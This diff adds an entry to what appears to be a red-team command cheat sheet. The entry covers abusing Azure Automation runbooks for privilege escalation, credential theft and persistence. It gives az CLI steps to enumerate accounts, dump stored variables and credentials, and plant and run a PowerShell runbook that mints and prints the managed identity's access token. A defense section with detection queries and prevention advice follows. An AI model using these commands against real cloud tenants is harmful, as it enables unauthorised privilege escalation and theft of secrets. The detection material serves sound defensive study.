@@ -1,0 +1,104 @@
+{
+  "id": "azure-automation-runbook-abuse",
+  "name": "Azure Automation Runbook Abuse - RunAs / Managed Identity",
+  "command": "az automation runbook create --automation-account-name <target> --resource-group <share> --name <profile> --type PowerShell",
+  "description": "Abuse an Azure Automation Account for privilege escalation and credential theft. With rights over an Automation Account, create or edit a runbook that executes under the account's attached managed identity (or legacy RunAs service principal), then use that identity's often-elevated RBAC role to act across the subscription or to extract stored credentials, variables, and connection secrets.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "Azure Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "NetSPI / Microsoft docs",
+  "tags": [
+    "azure",
+    "automation",
+    "runbook",
+    "managed-identity",
+    "runas",
+    "privesc",
+    "persistence"
+  ],
+  "mitre": [
+    "T1078.004",
+    "T1651"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY IT WORKS ===\n  An Automation Account can have a system/user-assigned managed identity\n  (or a legacy RunAs SP) with RBAC roles - frequently Contributor on the\n  subscription. A runbook you control runs AS that identity.\n\n=== PERMISSIONS ===\n  Automation Contributor (or write over runbooks) on the Automation Account.\n\n=== ENUMERATE ===\n  az automation account list -o table\n  az automation runbook list --automation-account-name <target> -g <share>\n  # stored assets that often hold secrets:\n  az automation variable list --automation-account-name <target> -g <share>\n  az automation credential list --automation-account-name <target> -g <share>\n\n=== PLANT A RUNBOOK THAT USES THE MANAGED IDENTITY ===\n  cat > pwn.ps1 <<'EOF'\nConnect-AzAccount -Identity\n# now acting as the Automation Account's managed identity:\n$t = (Get-AzAccessToken -ResourceUrl 'https://management.azure.com/').Token\nWrite-Output $t\nGet-AzRoleAssignment | Out-String\nEOF\n  az automation runbook create --automation-account-name <target> -g <share> \\\n    --name <profile> --type PowerShell\n  az automation runbook replace-content --automation-account-name <target> \\\n    -g <share> --name <profile> --content @pwn.ps1\n  az automation runbook publish --automation-account-name <target> -g <share> --name <profile>\n  az automation runbook start --automation-account-name <target> -g <share> --name <profile>\n  # read the job output to recover the token / results\n\n=== IMPACT ===\n  Token for the managed identity -> ARM/Graph as that SP; add role\n  assignments, read key vaults it can reach, persist via a scheduled runbook.",
+  "examples": [
+    {
+      "label": "List automation accounts and runbooks",
+      "command": "az automation runbook list --automation-account-name <target> -g <share> -o table"
+    },
+    {
+      "label": "Dump stored variables/credentials",
+      "command": "az automation variable list --automation-account-name <target> -g <share>"
+    },
+    {
+      "label": "Start a planted runbook",
+      "command": "az automation runbook start --automation-account-name <target> -g <share> --name <profile>"
+    }
+  ],
+  "references": [
+    {
+      "title": "NetSPI - Attacking Azure Automation Accounts",
+      "url": "https://www.netspi.com/blog/technical-blog/cloud-penetration-testing/maintaining-azure-persistence-via-automation-accounts/"
+    },
+    {
+      "title": "Microsoft docs - Managed identities for Automation",
+      "url": "https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "azure-managed-identity-token",
+      "note": "The runbook mints the managed-identity token used here.",
+      "rel": "prereq"
+    },
+    {
+      "id": "azure-arm-enum",
+      "note": "Enumerate Automation Accounts and their RBAC roles.",
+      "rel": "prereq"
+    },
+    {
+      "id": "cloud-microburst",
+      "note": "MicroBurst automates Automation Account cred extraction.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Automation runbooks are designed to run code under an attached identity. If that managed identity or legacy RunAs SP holds broad RBAC (often Contributor), anyone who can create, edit, or start a runbook can execute arbitrary code as that privileged identity and read the account's stored secrets.",
+    "prerequisites": "Write/contributor rights over the Automation Account (create/replace/publish/start runbooks); an attached managed identity or RunAs SP with meaningful RBAC roles.",
+    "impact": "Privilege escalation to the managed identity's roles (potentially subscription Contributor), theft of stored variables/credentials/connections and Key Vault secrets it can reach, and durable persistence via scheduled runbooks or webhooks.",
+    "detection": "[MITRE T1651] Azure Activity log operations on runbooks (write/publish/start) from unusual principals; Automation job logs showing unexpected scripts; managed-identity token requests followed by role-assignment or Key Vault access it does not normally perform.",
+    "artifacts": "AzureActivity 'Microsoft.Automation/automationAccounts/runbooks/write|publish|start', Automation job streams/output, new role assignments by the Automation identity, Key Vault AuditEvent access from the Automation SP.",
+    "splunk_spl": "index=azure sourcetype=azure:activity operationNameValue=\"MICROSOFT.AUTOMATION/AUTOMATIONACCOUNTS/RUNBOOKS/*\"\n| stats count values(operationNameValue) as ops by caller, resourceId, callerIpAddress",
+    "elastic_kql": "azure.activitylogs.operation_name:(*Automation*runbooks*write* or *Automation*runbooks*publish* or *Automation*runbooks*start*)",
+    "sentinel_kql": "AzureActivity\n| where OperationNameValue has \"AUTOMATIONACCOUNTS/RUNBOOKS\"\n| where OperationNameValue has_any (\"WRITE\",\"PUBLISH\",\"START\")\n| summarize Count=count(), Ops=make_set(OperationNameValue) by Caller, _ResourceId, CallerIpAddress",
+    "sigma_rules": "azure_automation_runbook_abuse",
+    "prevention": "Grant Automation managed identities least-privilege RBAC (never subscription Contributor); restrict who can write/publish/start runbooks; disable legacy RunAs accounts; store secrets in Key Vault with tight access rather than Automation variables; enable Automation diagnostic logs and alert on runbook writes/starts by non-automation principals.",
+    "sources": [
+      "https://www.netspi.com/blog/technical-blog/cloud-penetration-testing/maintaining-azure-persistence-via-automation-accounts/",
+      "https://learn.microsoft.com/en-us/azure/automation/enable-managed-identity-for-automation"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Automation runbook created/published/started by unusual principal",
+        "logic": "AzureActivity\n| where OperationNameValue has \"AUTOMATIONACCOUNTS/RUNBOOKS\" and OperationNameValue has_any (\"WRITE\",\"PUBLISH\",\"START\")\n| summarize Count=count(), Ops=make_set(OperationNameValue) by Caller, _ResourceId, CallerIpAddress",
+        "data_source": "azure-activity",
+        "attack": [
+          "T1651",
+          "T1078.004"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Legitimate automation authors and CI/CD updating runbooks",
+        "tuning": "Allowlist known runbook authors/service principals; alert on runbook writes/starts from interactive human accounts or new IPs"
+      }
+    ]
+  }
+}
